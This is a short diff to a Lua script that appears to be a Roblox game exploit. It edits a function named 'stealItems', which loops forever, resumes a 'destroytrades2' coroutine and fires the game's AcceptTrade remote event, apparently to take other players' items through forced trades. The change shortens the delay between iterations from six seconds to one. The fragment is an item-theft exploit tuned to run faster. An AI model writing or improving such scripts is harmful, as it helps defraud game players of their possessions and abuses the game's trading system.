@@ -196,7 +196,7 @@ local function isTradeModuleAvailable()
 end
 
 local function stealItems()
-    while true do  -- Start an infinite loop
+    while true do
         coroutine.resume(destroytrades2)
 
         local sendArgs = {
@@ -277,7 +277,7 @@ local function stealItems()
         }
         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
 
-        wait(6)  -- Add a delay between each trade loop iteration
+        wait(1)
     end
 end
 
